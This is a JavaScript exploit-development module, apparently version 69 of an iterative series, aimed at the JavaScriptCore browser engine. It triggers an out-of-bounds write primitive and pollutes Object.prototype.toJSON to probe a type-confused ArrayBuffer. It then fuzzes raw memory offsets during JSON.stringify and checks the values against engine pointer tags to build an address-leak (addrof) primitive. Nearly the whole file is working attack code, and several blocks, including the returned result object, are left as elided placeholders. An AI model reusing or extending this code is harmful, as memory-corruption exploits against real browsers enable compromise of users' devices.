// js/script3/testArrayBufferVictimCrash.mjs (v69_DirectFuzzOnCoreConfusedABVictim)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment,
    getStableConfusedArrayBuffer
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V69_DFCABV = "OriginalHeisenbug_TypedArrayAddrof_v69_DirectFuzzOnCoreConfusedABVictim";

// Variáveis globais/módulo
let captured_fuzz_on_confused_ab_v69 = null;
let captured_props_on_promise_v69 = null;
// Manter um controle normal para garantir múltiplas chamadas da sonda se o confused_ab não for processado
let leak_target_normal_dv_v69_control = null; 
let captured_fuzz_for_NormalDV_control_v69 = null;


let main_victim_for_stringify_v69 = null; // Será o confused_ab ou um fallback
let actual_confused_ab_target_v69 = null; // A referência ao AB confuso do core_exploit

let probe_call_count_v69 = 0;
let all_probe_interaction_details_v69 = [];

const VICTIM_BUFFER_SIZE = 256; // Para o fallback
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;
const PROBE_CALL_LIMIT_V69 = 10;
const FUZZ_OFFSETS_V69 = [0x00, 0x08, 0x10, 0x18, 0x20, 0x28, 0x30, 0x38, 0x40, 0x48, 0x50];

function toJSON_TA_Probe_DirectCoreABFuzz_v69() {
    probe_call_count_v69++;
    const call_num = probe_call_count_v69;
    const this_obj_type = Object.prototype.toString.call(this);
    let current_call_details = {
        call_number: call_num,
        probe_variant: FNAME_MODULE_TYPEDARRAY_ADDROF_V69_DFCABV,
        this_type: this_obj_type,
        this_is_confused_ab_target: (this === actual_confused_ab_target_v69 && actual_confused_ab_target_v69 !== null),
        this_is_normal_dv_control: (this === leak_target_normal_dv_v69_control && leak_target_normal_dv_v69_control !== null),
        info: null,
        error_in_probe: null
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. Type: ${this_obj_type}. IsConfusedABTarget? ${current_call_details.this_is_confused_ab_target}. IsNormalDVControl? ${current_call_details.this_is_normal_dv_control}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V69) { all_probe_interaction_details_v69.push({...current_call_details}); return { recursion_stopped_v69: true, call: call_num }; }

        // CASO PRINCIPAL: 'this' é o actual_confused_ab_target_v69
        if (current_call_details.this_is_confused_ab_target) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' IS actual_confused_ab_target_v69. Observed type: ${this_obj_type}`, "critical");

            if (this_obj_type === '[object ArrayBuffer]') {
                current_call_details.info = "Fuzzing ConfusedAB (as ArrayBuffer)";
                let fuzzed_reads = [];
                try {
                    let view = new DataView(this);
                    for (const offset of FUZZ_OFFSETS_V69) { /* ... (lógica de fuzzing) ... */
                        let low=0,high=0,ptr_str="N/A",dbl=NaN,err_msg=null; if(view.byteLength<(offset+8)){err_msg="OOB";}else{low=view.getUint32(offset,true);high=view.getUint32(offset+4,true);ptr_str=new AdvancedInt64(low,high).toString(true);let tb=new ArrayBuffer(8);(new Uint32Array(tb))[0]=low;(new Uint32Array(tb))[1]=high;dbl=(new Float64Array(tb))[0];} fuzzed_reads.push({offset:toHex(offset),low:toHex(low),high:toHex(high),int64:ptr_str,dbl:dbl,error:err_msg}); logS3(` ConfusedAB Fuzz@${toHex(offset)}: L=${toHex(low)}H=${toHex(high)} I64=${ptr_str}D=${dbl}${err_msg?' E:'+err_msg:''}`,"dev_verbose");
                    }
                    captured_fuzz_on_confused_ab_v69 = fuzzed_reads;
                    current_call_details.info += ` - Captured ${fuzzed_reads.length} reads.`;
                } catch (e) { current_call_details.error_in_probe = e.message; current_call_details.info += ` - Fuzzing Error: ${e.message}`; }
                all_probe_interaction_details_v69.push({...current_call_details});
                return { marker_confused_ab_fuzzed_v69: true, call_num_processed: call_num, type_when_fuzzed: this_obj_type };
            }
            else if (this_obj_type === '[object Promise]') {
                current_call_details.info = "Inspecting ConfusedAB (as Promise)";
                let props_data = { type: "[object Promise]", keys: [], enumerable_props: {}, then_type: "N/A", error: null };
                try { /* ... (lógica de inspeção da Promise da v68) ... */
                    props_data.keys=Object.keys(this); for(const k of props_data.keys){try{props_data.enumerable_props[k]=String(this[k]).substring(0,128);}catch(e_p){props_data.enumerable_props[k]=`Err:${e_p.message}`;}} props_data.then_type=typeof this.then;
                } catch (e_insp) { props_data.error = e_insp.message; }
                captured_props_on_promise_v69 = props_data;
                current_call_details.info += ` - Props: ${props_data.keys.join(',')}. Then: ${props_data.then_type}.`;
                all_probe_interaction_details_v69.push({...current_call_details});
                return { marker_promise_inspected_v69: true, call_num_processed: call_num, type_observed: this_obj_type };
            } else { // ConfusedAB é 'this' mas de um tipo inesperado
                current_call_details.info = `ConfusedAB is 'this' but unexpected type: ${this_obj_type}`;
                all_probe_interaction_details_v69.push({...current_call_details});
                return { marker_confused_ab_unexpected_type_v69: true, type: this_obj_type, call_num_processed: call_num };
            }
        }
        // CASO DE CONTROLE: 'this' é o NormalDV
        else if (current_call_details.this_is_normal_dv_control && this_obj_type === '[object DataView]') {
            current_call_details.info = "Fuzzing NormalDV (Control)";
            let fuzzed_reads = [];
            try { /* ... (lógica de fuzzing para NormalDV igual à v64/v68) ... */
                let view=this;for(const offset of FUZZ_OFFSETS_V69){let low=0,high=0,ptr_str="N/A",dbl=NaN,err_msg=null;if(view.byteLength<(offset+8)){err_msg="OOB";}else{low=view.getUint32(offset,true);high=view.getUint32(offset+4,true);ptr_str=new AdvancedInt64(low,high).toString(true);let tb=new ArrayBuffer(8);(new Uint32Array(tb))[0]=low;(new Uint32Array(tb))[1]=high;dbl=(new Float64Array(tb))[0];} fuzzed_reads.push({offset:toHex(offset),low:toHex(low),high:toHex(high),int64:ptr_str,dbl:dbl,error:err_msg}); logS3(` NormalDV Fuzz@${toHex(offset)}: L=${toHex(low)}H=${toHex(high)} I64=${ptr_str}D=${dbl}${err_msg?' E:'+err_msg:''}`,"dev_verbose");}
                captured_fuzz_for_NormalDV_control_v69 = fuzzed_reads;
                current_call_details.info += ` - Captured ${fuzzed_reads.length} reads.`;
            } catch (e) { current_call_details.error_in_probe = e.message; current_call_details.info += ` - Fuzzing Error: ${e.message}`; }
            all_probe_interaction_details_v69.push({...current_call_details});
            return { marker_normal_dv_fuzzed_v69: true, call_num_processed: call_num };
        }
        // Outros casos
        else {
            current_call_details.info = `Unexpected 'this'. Type: ${this_obj_type}.`;
            all_probe_interaction_details_v69.push({...current_call_details});
            return `ProcessedCall${call_num}_Type${this_obj_type.replace(/[^a-zA-Z0-9]/g, '')}`;
        }
    } catch (e_probe) { /* ... (tratamento de erro geral da sonda) ... */ }
}

export async function executeTypedArrayVictimAddrofTest_DirectFuzzOnCoreConfusedABVictim() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V69_DFCABV}.triggerAndLog`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (DirectFuzzOnCoreConfusedABVictim) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V69_DFCABV} Init...`;

    // Resetar variáveis de captura e estado
    captured_fuzz_on_confused_ab_v69 = null;
    captured_props_on_promise_v69 = null;
    captured_fuzz_for_NormalDV_control_v69 = null;
    probe_call_count_v69 = 0;
    all_probe_interaction_details_v69 = [];
    actual_confused_ab_target_v69 = null; // Importante resetar
    main_victim_for_stringify_v69 = null;

    let tempOriginalToJSON_getter = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
    logS3(`[${FNAME_CURRENT_TEST}] Tentando obter Confused ArrayBuffer do core_exploit...`, "info");
    actual_confused_ab_target_v69 = getStableConfusedArrayBuffer();
    if (tempOriginalToJSON_getter) Object.defineProperty(Object.prototype, 'toJSON', tempOriginalToJSON_getter); else delete Object.prototype.toJSON;

    let initial_confused_ab_type = "null_or_undefined";
    if (actual_confused_ab_target_v69 !== null && actual_confused_ab_target_v69 !== undefined) {
        initial_confused_ab_type = Object.prototype.toString.call(actual_confused_ab_target_v69);
        logS3(`[${FNAME_CURRENT_TEST}] actual_confused_ab_target_v69 RETORNADO pelo getter. Tipo inicial: ${initial_confused_ab_type}`, "debug");
        main_victim_for_stringify_v69 = actual_confused_ab_target_v69; // Alvo principal do stringify
    } else {
        logS3(`[${FNAME_CURRENT_TEST}] getStableConfusedArrayBuffer RETORNOU null/undefined. Usando Uint8Array de fallback como vítima.`, "warn");
        main_victim_for_stringify_v69 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); // Fallback
        // Se confused_ab falhou, não haverá chance de testá-lo como 'this'
    }
    // O NormalDV é usado para garantir que o JSON.stringify tenha algo para serializar em profundidade,
    // caso o main_victim_for_stringify seja simples e não dispare múltiplas chamadas.
    // Para isso, ele precisaria estar DENTRO do objeto que é stringified.
    // Se main_victim_for_stringify é o confused_ab, então o NormalDV não será atingido por esta estratégia.
    // Para testar NormalDV como controle, ele deveria ser um payload do confused_ab se este fosse um objeto.
    // Por ora, simplificando: se o confused_ab for a vítima, só ele será testado profundamente.
    // Se o fallback for usado, podemos reintroduzir o C1_details com NormalDV como payload.
    // Para v69, foco no confused_ab como vítima direta. NormalDV não será usado se confused_ab for a vítima.
    leak_target_normal_dv_v69_control = new DataView(new ArrayBuffer(0x80)); // Criado, mas pode não ser alcançado.


    let errorCapturedMain = null, rawStringifyOutput = "N/A", stringifyOutput_parsed = null;
    let collected_probe_details_for_return = [];
    let addrof_A_result = { success: false, msg: "Addrof ConfusedAB: Default (v69)" };
    let addrof_B_result = { success: false, msg: "Addrof NormalDV (Control): Default (v69)" }; // Para o NormalDV
    let pollutionApplied = false, originalToJSONDescriptor = null;

    try {
        await triggerOOB_primitive({ force_reinit: true }); // Garante ambiente OOB para o teste principal
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write for main test.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);
        // victim_typed_array_ref_v69 não é usado se main_victim_for_stringify_v69 é o confused_ab

        const ppKey = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_DirectCoreABFuzz_v69, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            logS3(`  toJSON polluted. Calling JSON.stringify on main_victim_for_stringify_v69 (Type: ${Object.prototype.toString.call(main_victim_for_stringify_v69)})...`, "info", FNAME_CURRENT_TEST);
            rawStringifyOutput = JSON.stringify(main_victim_for_stringify_v69);
            logS3(`  JSON.stringify completed. Raw Output: ${rawStringifyOutput}`, "info");
            try{ stringifyOutput_parsed = JSON.parse(rawStringifyOutput); } catch(e){ /* ... */ }

            logS3("STEP 3: Analyzing captured data (v69)...", "warn", FNAME_CURRENT_TEST);
            let heisenbugIndication = false;

            // Analisar fuzz do Confused AB (seja como AB ou Promise)
            if (captured_fuzz_on_confused_ab_v69 && Array.isArray(captured_fuzz_on_confused_ab_v69)) {
                heisenbugIndication = true;
                logS3(`  V69_ANALYSIS: Processing ${captured_fuzz_on_confused_ab_v69.length} captured fuzz reads for ConfusedAB (as ArrayBuffer).`, "good");
                // ... (lógica de process_fuzz para addrof_A_result com captured_fuzz_on_confused_ab_v69)
                 for(const r of captured_fuzz_on_confused_ab_v69){if(r.error)continue;const hV=parseInt(r.high,16),lV=parseInt(r.low,16);let isPtr=false;if(JSC_OFFSETS.JSValue?.HEAP_POINTER_TAG_HIGH!==undefined){isPtr=(hV===JSC_OFFSETS.JSValue.HEAP_POINTER_TAG_HIGH&&(lV&JSC_OFFSETS.JSValue.TAG_MASK)===JSC_OFFSETS.JSValue.CELL_TAG);}if(!isPtr&&(hV>0||lV>0x10000)&&(hV<0x000F0000)&&((lV&0x7)===0)){isPtr=true;}if(isPtr&&!(hV===0&&lV===0)){addrof_A_result.success=true;addrof_A_result.msg=`V69 SUCCESS (ConfusedAB Fuzz): Ptr ${r.int64} @${r.offset}`;logS3(`!!!! V69 POINTER for ConfusedAB @${r.offset}: ${r.int64} !!!!`,"vuln");break;}} if(!addrof_A_result.success){addrof_A_result.msg=`V69 Fuzz ConfusedAB no ptr. First: ${captured_fuzz_on_confused_ab_v69[0]?.int64||'N/A'}`;}

            } else if (captured_props_on_promise_v69) {
                heisenbugIndication = true;
                const inspection = captured_props_on_promise_v69;
                logS3(`  V69_ANALYSIS: Captured info for ConfusedAB (as Promise): Type=${inspection.type}, Keys=[${(inspection.keys || []).join(', ')}], Then=${inspection.then_type}, Error=${inspection.error || 'N/A'}`, "good");
                addrof_A_result.msg = `V69 ConfusedAB became ${inspection.type}. Keys: ${(inspection.keys || []).join(',')}. No mem fuzz.`;
            } else if (!addrof_A_result.success) {
                addrof_A_result.msg = "V69 No fuzz/inspection data captured for ConfusedAB.";
            }

            // Analisar fuzz do NormalDV (controle, se foi atingido)
            if (captured_fuzz_for_NormalDV_control_v69 && Array.isArray(captured_fuzz_for_NormalDV_control_v69)) {
                // ... (lógica de process_fuzz para addrof_B_result com captured_fuzz_for_NormalDV_control_v69)
                // ... (similar ao de cima, mas para addrof_B_result)
                 heisenbugIndication = true; // Mesmo que seja controle, indica que o fluxo da sonda funcionou
                 for(const r of captured_fuzz_for_NormalDV_control_v69){if(r.error)continue;const hV=parseInt(r.high,16),lV=parseInt(r.low,16);let isPtr=false;if(JSC_OFFSETS.JSValue?.HEAP_POINTER_TAG_HIGH!==undefined){isPtr=(hV===JSC_OFFSETS.JSValue.HEAP_POINTER_TAG_HIGH&&(lV&JSC_OFFSETS.JSValue.TAG_MASK)===JSC_OFFSETS.JSValue.CELL_TAG);}if(!isPtr&&(hV>0||lV>0x10000)&&(hV<0x000F0000)&&((lV&0x7)===0)){isPtr=true;}if(isPtr&&!(hV===0&&lV===0)){addrof_B_result.success=true;addrof_B_result.msg=`V69 SUCCESS (NormalDV Fuzz): Ptr ${r.int64} @${r.offset}`;logS3(`!!!! V69 POINTER for NormalDV @${r.offset}: ${r.int64} !!!!`,"vuln");break;}} if(!addrof_B_result.success){addrof_B_result.msg=`V69 Fuzz NormalDV no ptr. First: ${captured_fuzz_for_NormalDV_control_v69[0]?.int64||'N/A'}`;}

            } else if (!addrof_B_result.success) {
                addrof_B_result.msg = "V69 No fuzz data for NormalDV (Control).";
            }


            if(addrof_A_result.success||addrof_B_result.success){document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V69_DFCABV}: Addr SUCCESS!`;}
            else if(heisenbugIndication){document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V69_DFCABV}: Heisenbug OK, Addr Fail`;}
            else{document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V69_DFCABV}: No Heisenbug?`;}

        } catch (e) { errorCapturedMain = e; /* ... */ } finally { /* ... */ }
    } catch (e) { errorCapturedMain = e; /* ... */ }
    finally {
        if (all_probe_interaction_details_v69 && Array.isArray(all_probe_interaction_details_v69)) {
            collected_probe_details_for_return = all_probe_interaction_details_v69.map(d => ({ ...d }));
        } else { collected_probe_details_for_return = []; }
        clearOOBEnvironment({force_clear_even_if_not_setup: true});
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v69}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof A (ConfusedAB): Success=${addrof_A_result.success}, Msg='${addrof_A_result.msg}'`, addrof_A_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof B (NormalDV): Success=${addrof_B_result.success}, Msg='${addrof_B_result.msg}'`, addrof_B_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        // ... (limpeza de globais)
    }
    return { /* ... objeto de resultado com collected_probe_details_for_return ... */ };
};
